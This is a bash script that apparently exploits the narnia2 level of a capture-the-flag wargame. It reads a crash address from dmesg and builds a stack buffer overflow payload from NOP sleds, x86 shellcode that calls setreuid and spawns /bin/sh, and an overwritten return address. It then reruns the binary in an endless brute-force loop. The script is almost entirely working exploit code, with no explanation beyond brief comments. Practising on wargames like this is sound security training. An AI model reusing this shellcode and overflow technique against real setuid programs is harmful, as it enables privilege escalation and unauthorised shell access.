#!/bin/bash

# seg fault
./narnia2 `./test.py`

# grab addr
str="$(dmesg | tail -1)"

# crop addr
str=${str##*sp 00000000}
str=${str%% error*}
str_len=${#str}

if [[ ! $((str_len % 2)) -eq 0 ]];then
	str=0"$str"
fi

echo "SEG FAULT at address: 0x$str"

for i in $(seq 0 2 $((str_len - 2)));do
	ret='\x'${str:$i:2}"$ret"
done

echo "Reversed address in bytes: $ret"

# building bof
# 90 bytes NOP sled
bof=$(printf '\x90%.0s' {1..90})

# shellcode 46 bytes
bof=$bof"\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB\x16\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D\x53\x0C\xCD\x80\xE8\xE5\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68"

# return address
bof=$bof"$ret"

# 500 more bytes NOP sled + shellcode
bof=$bof$(printf '\x90%.0s' {1..500})
bof=$bof"\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB\x16\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D\x53\x0C\xCD\x80\xE8\xE5\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68"

# run
echo

i=0
while :;do
	i=$((i + 1))
	echo "Running ./narnia2 with ${#bof} bytes of input... bf#$i"
	./narnia2 "$(echo -ne $bof)"
done
